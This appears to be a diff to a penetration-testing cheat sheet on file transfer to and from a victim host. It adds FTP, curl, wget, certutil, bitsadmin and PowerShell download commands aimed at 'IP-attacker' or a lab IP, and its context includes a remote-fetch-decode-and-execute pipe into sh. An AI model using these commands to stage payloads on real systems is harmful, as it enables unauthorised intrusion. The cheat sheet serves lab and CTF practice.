@@ -42,7 +42,15 @@ atftpd --daemon --port 69 /tftp
 ```
 
 ## FTP
-
+A FTP server could be installed on the attacker system, however there is another option with Python possible.
+First the Python FTP library should be installed.
+```bash
+sudo apt-get install python-pyftpdlib
+```
+Now from any location it is possible to run the FTP server.
+```bash
+sudo python -m pyftpdlib -p 21
+```
 
 ## SMB
 __Impacket__
@@ -57,7 +65,12 @@ From the client the following options could be used to retrieve or send a file
 ## Linux
 
 __HTTP Download__
+curl
+```bash
+curl -O http://IP-attacker/filename.sh
+```
 
+wget
 ```bash
 wget http://IP-attacker/filename.sh
 ```
@@ -80,15 +93,21 @@ curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim decode the fi
 
 
 __HTTP Download__
+Certutil
 ```bash
 certutil -urlcache -f http://IP-attacker/filename.exe shell.exe
 ```
-
+bitsadmin
 ```bash
 bitsadmin /transfer n http://IP-attacker/file c:%homepath%file
 ```
+curl
+```bash
+curl http://192.168.1.2/putty.exe -o putty.exe
+```
 
 __FTP Download/Upload__
+Side note, always set FTP to binary mode by typing binary. This will stop anything you upload being corrupted, eg nc.exe.
 ```bash
 echo "open <IP> ">ftp.txt
 echo "user">>ftp.txt
@@ -110,8 +129,36 @@ tftp -i [kali ip] get [file]
 
 __SMB Download/Upload__
 
+__wget (Powershell)__
+```bash
+powershell
+wget http://192.168.1.2/putty.exe -OutFile putty.exe
+dir
+```
+or you can it run like:
+```bash
+powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe
+```
 
+__IWR - Invoke Web-Request (Powershell)__
 
+```bash
+powershell.exe -command iwr -Uri http://192.168.1.2/putty.exe -OutFile C:\Temp\putty.exe "
+```
+or a bit shotter
+```bash
+powershell.exe iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
+```
+or you can run it within Powershell as follows:
+```bash
+powershell
+iwr -uri 192.168.1.2/putty.exe -o C:\Temp\putty.exe
+dir
+```
+__Powershell__
+```bash
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/putty.exe', 'putty.exe')
+```
 __VBScript via HTTP__
 This works for Windows XP, 2003 (if still used during a CTF).
 Moderate speed of 50kb/sec. 
